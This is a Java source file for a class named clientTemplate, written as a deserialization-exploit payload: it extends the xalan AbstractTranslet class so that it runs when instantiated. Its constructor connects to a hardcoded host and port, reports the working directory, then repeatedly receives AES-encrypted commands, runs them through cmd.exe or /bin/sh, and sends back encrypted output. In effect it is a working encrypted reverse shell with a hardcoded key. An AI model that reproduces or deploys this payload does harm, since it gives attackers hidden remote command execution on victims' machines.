package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

public class clientTemplate extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    static String key = "I72YPGxLFctx1GnG";
    public static String encrypt(String cmd) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE,secretKeySpec);
        byte[] bytes = cipher.doFinal(cmd.getBytes());
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static String decrypt(String encryptedData) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        byte[] original = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
        return new String(original);
    }
    public String executeCmd(String[] cmd) throws IOException {
        try{
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(cmd);
            // 使用BufferedReader读取命令的输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return String.valueOf(output);
        }
        catch (Exception e){
            return String.valueOf(e);
        }

    }

    public clientTemplate() throws Exception {
        super();
        String ip = "127.0.0.1";
        int port = 8888;
        String[] shell = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
        String currentDir = System.getProperty("user.dir");
        System.out.println();
        try {
            Socket s = new Socket(ip, port);
            InputStream is = s.getInputStream();
            DataInputStream dis = new DataInputStream(is);
            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeUTF(currentDir);
            while (true){
                String cmd = dis.readUTF();
                if ("exit".equalsIgnoreCase(decrypt(cmd))){
                    break;//退出进程
                }
                String[] cmder = {shell[0], shell[1], decrypt(cmd)};
                dos.writeUTF(encrypt(executeCmd(cmder)));
            }
            dis.close();
            is.close();
            dos.close();
            os.close();
            s.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
